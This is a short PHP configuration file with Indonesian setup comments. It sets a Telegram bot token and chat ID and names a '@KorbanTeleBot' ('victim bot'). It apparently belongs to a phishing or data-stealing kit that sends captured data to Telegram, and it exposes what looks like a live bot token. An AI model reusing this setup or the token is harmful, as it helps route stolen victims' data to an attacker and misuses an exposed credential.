<?php 
$id_bot = "7673148400:AAGfAbD9ZdrqFEMKpipIlhCVQGtNF8UGB3s"; // Bot Baru -> Add @BotFather, Klik Start, Kasih nama bot, copy Access Token lalu paste disini
$telegram_id   = "7719970135"; // Ganti ChatId -> Add @chatIDrobot di telegram, klik start, copy chatId lalu Paste disini || KLIK START PADA BOT @KorbanTeleBot

// Note, Akun telegram kamu harus Join/Bergabung ke BOT yang kamu buat


?>